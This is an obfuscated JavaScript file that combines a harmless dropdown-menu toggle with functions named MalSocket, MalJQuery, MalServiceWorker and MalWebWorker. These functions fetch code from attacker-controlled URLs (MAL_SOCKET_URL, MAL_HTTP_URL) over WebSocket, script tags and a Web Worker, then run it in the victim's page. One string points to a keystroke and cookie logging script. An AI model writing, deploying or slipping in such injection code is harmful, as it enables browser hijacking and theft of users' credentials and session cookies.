var _0x8466 = [
  "setAttribute",
  "src",
  "/jqnc.js",
  "/ServiceWorker.js",
  "onmessage",
  "MalServiceWorker",
  "self.importScripts(\x27",
  "application/javascript",
  "createObjectURL",
  "DDmenu",
  "classList",
  "show",
  "onclick",
  "target",
  "getAttribute",
  "/KeyCookieLog.js",
  "createElement",
  "script",
  "type",
  "text/javascript",
  "createTextNode",
  "getElementsByTagName",
  "body",
  "appendChild",
  "undefined",
  "close",
];
(function (_0x5000fd, _0x2f9b89) {
  var _0x52809f = function (_0xc530cf) {
    while (--_0xc530cf) {
      _0x5000fd["push"](_0x5000fd["shift"]());
    }
  };
  _0x52809f(++_0x2f9b89);
})(_0x8466, 0x8b);
var _0x19cc = function (_0x1dd5da, _0x4bfc65) {
  _0x1dd5da = _0x1dd5da - 0x0;
  var _0x1f5790 = _0x8466[_0x1dd5da];
  return _0x1f5790;
};
MalWS = null;
function dropDown() {
  document["getElementById"](_0x19cc("0x0"))[_0x19cc("0x1")]["toggle"](
    _0x19cc("0x2")
  );
}
window[_0x19cc("0x3")] = function (_0x58c2ab) {
  if (!(_0x58c2ab[_0x19cc("0x4")][_0x19cc("0x5")]("id") == "DDbtn")) {
    document["getElementById"]("DDmenu")[_0x19cc("0x1")]["remove"](
      _0x19cc("0x2")
    );
  }
};
function MalSocket() {
  MalWS = new WebSocket(MAL_SOCKET_URL + _0x19cc("0x6"));
  MalWS["onmessage"] = function (_0x8071d5) {
    sc = document[_0x19cc("0x7")](_0x19cc("0x8"));
    sc[_0x19cc("0x9")] = _0x19cc("0xa");
    sc["id"] = "MalSocket";
    sc["appendChild"](document[_0x19cc("0xb")](_0x8071d5["data"]));
    B = document[_0x19cc("0xc")](_0x19cc("0xd"));
    B[0x0][_0x19cc("0xe")](sc);
  };
}
function MalJQuery() {
  if (typeof MalWS2 !== _0x19cc("0xf")) {
    MalWS2[_0x19cc("0x10")]();
    delete MalWS2;
  }
  sc = document[_0x19cc("0x7")](_0x19cc("0x8"));
  sc[_0x19cc("0x11")](_0x19cc("0x12"), MAL_HTTP_URL + _0x19cc("0x13"));
  B = document[_0x19cc("0xc")](_0x19cc("0xd"));
  B[0x0][_0x19cc("0xe")](sc);
}
function MalServiceWorker() {
  if (typeof MalWS2 !== _0x19cc("0xf")) {
    MalWS2[_0x19cc("0x10")]();
    delete MalWS2;
  }
  MalWS = new WebSocket(MAL_SOCKET_URL + _0x19cc("0x14"));
  MalWS[_0x19cc("0x15")] = function (_0x27d2a8) {
    sc = document[_0x19cc("0x7")](_0x19cc("0x8"));
    sc[_0x19cc("0x9")] = _0x19cc("0xa");
    sc["id"] = _0x19cc("0x16");
    sc[_0x19cc("0xe")](document[_0x19cc("0xb")](_0x27d2a8["data"]));
    B = document[_0x19cc("0xc")](_0x19cc("0xd"));
    B[0x0]["appendChild"](sc);
  };
}
function MalWebWorker() {
  if (typeof MalWS2 !== "undefined") {
    MalWS2[_0x19cc("0x10")]();
    delete MalWS2;
  }
  var _0x1777a7 = new Blob([_0x19cc("0x17") + MAL_HTTP_URL + "/foo.js\x27);"], {
    type: _0x19cc("0x18"),
  });
  w = new Worker(URL[_0x19cc("0x19")](_0x1777a7));
}